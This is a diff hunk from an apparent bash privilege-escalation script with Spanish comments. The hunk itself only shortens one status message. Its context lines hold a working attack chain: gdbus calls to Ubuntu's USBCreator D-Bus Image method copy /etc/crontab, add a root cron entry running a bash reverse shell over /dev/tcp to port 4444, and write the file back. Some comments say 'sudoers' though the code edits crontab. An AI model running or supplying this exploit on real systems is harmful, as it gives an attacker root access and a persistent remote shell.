@@ -75,7 +75,7 @@ case "$input" in
 		echo -e ${greenColour}"[*] Obteniendo copia del archivo /etc/crontab"${endColour}
 		gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /etc/crontab $(pwd)/.fake_crontab.txt true > /dev/null # Obtenemos 1 copia del archivo sudoers
 		cp .fake_crontab.txt .fake_crontab_editable.txt # Creamos una copia de la copia para poder editarlo
-		echo -e ${greenColour}"[*] Agregando REVERSE SHELL al CRON De ROOT -- $current_user ALL=(ALL) ALL"${endColour}
+		echo -e ${greenColour}"[*] Agregando REVERSE SHELL al CRON De ROOT"${endColour}
 		echo "*/1 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" >> .fake_crontab_editable.txt # Agregamos la reverse shell al cron de root
 		echo -e ${greenColour}"[*] Sobreescribiriendo nuestra copia en /etc/crontab con GDBus."${endColour}
 		gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image $(pwd)/.fake_crontab_editable.txt /etc/crontab true > /dev/null # Guardamos nuestro sudoers  editado al original
